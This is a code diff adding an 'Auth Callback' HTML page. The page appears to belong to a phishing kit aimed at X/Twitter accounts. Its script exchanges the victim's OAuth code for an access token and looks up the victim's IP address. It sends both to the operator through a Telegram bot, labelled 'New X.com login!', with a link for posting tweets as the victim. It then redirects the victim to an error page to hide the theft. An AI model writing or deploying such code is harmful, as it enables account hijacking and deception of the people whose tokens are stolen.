@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Auth Callback</title>
+</head>
+<body>
+    <script>
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            console.error('Error getting IP:', error);
+            return 'Unknown IP';
+        }
+    }
+
+    window.onload = async function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const code = urlParams.get('code');
+        const error = urlParams.get('error');
+        
+        if (error) {
+            console.log('Error from Twitter:', error);
+            window.location.replace('/error.html');
+            return;
+        }
+        
+        if (code) {
+            try {
+                console.log('Got code from Twitter:', code);
+                const response = await fetch('https://yourdomain.com/token', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ code })
+                });
+                
+                const data = await response.json();
+                console.log('Token response:', data);
+                
+                if (data.error) {
+                    throw new Error(data.error);
+                }
+
+                // Get IP address
+                const ipAddress = await getIPAddress();
+
+                const TELEGRAM_BOT_TOKEN = 'Telegrambottoken';
+                const TELEGRAM_USER_ID = 'Useridtelegram';
+                const tweetUrl = `https://yourdomain.com/tweet.html?access-token=${data.access_token}`;
+                
+                console.log('Sending to Telegram:', {
+                    chat_id: TELEGRAM_USER_ID,
+                    text: `New X.com login!\nIP Address: ${ipAddress}\nPress the button below to post a tweet.\n\n_Created by @qazdrdev`,
+                    url: tweetUrl
+                });
+
+                const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_USER_ID,
+                        text: `New X.com login!\nIP Address: ${ipAddress}\nPress the button below to post a tweet.\n\n_Created by @qazdrdev`,
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [[
+                                {
+                                    text: 'Open Tweet Page',
+                                    url: tweetUrl
+                                }
+                            ]]
+                        }
+                    })
+                });
+
+                const telegramData = await telegramResponse.json();
+                console.log('Telegram response:', telegramData);
+
+                // Wacht even voordat we redirecten
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                window.location.replace('/error.html');
+                
+            } catch (error) {
+                console.error('Error:', error);
+                window.location.replace('/error.html');
+            }
+        } else {
+            console.log('No code found in URL');
+            window.location.replace('/error.html');
+        }
+    }
+    </script>
+</body>
+</html> 
